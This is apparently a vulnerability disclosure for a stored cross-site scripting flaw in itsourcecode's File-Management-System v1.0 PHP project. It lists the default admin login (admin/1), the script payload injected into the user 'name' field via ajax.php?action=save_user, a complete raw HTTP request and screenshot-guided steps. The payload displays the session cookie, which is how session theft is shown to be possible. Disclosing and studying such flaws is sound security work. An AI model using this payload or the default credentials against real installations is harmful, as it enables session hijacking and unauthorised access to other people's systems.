# File-Management-System v1.0 by itsourcecode.com has Cross-site Scripting (XSS)

The password for the backend login account is: admin/1

vendors: https://itsourcecode.com/free-projects/php-project/file-management-system-in-php-with-source-code/

Vulnerability File:  /filesystem/ajax.php

Vulnerability location:  /filesystem/ajax.php?action=save_user HTTP/1.1

[+] Payload: <script>alert(document.cookie)</script>

Tested on Windows 10, phpStudy

There is an example with alert:

```
POST /filesystem/ajax.php?action=save_user HTTP/1.1
Host: 10.12.180.79
Content-Length: 92
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://10.12.180.79
Referer: http://10.12.180.79/filesystem/index.php?page=users
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=d4me9tekbcuef2k8k1qupv9i0t
Connection: close

id=1&name=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&username=admin&password=1&type=1
```

Click Users on the left

![image](https://user-images.githubusercontent.com/56795018/221362762-209a0b00-e739-4ccb-a472-b0e2c3725d24.png)

then click the edit button as shown in the screenshoot

![image](https://user-images.githubusercontent.com/56795018/221362814-04e39d1f-5508-41e3-bdd6-0f77e7615e99.png)

input a XSS script in Name input,and click save

![image](https://user-images.githubusercontent.com/56795018/221362893-13df6367-a858-46b9-b495-5cf5362fee30.png)

soon you will see an alert showing your cookie

![image](https://user-images.githubusercontent.com/56795018/221362975-f5621ee1-fea1-4d25-bf6f-b3257c38f4f9.png)
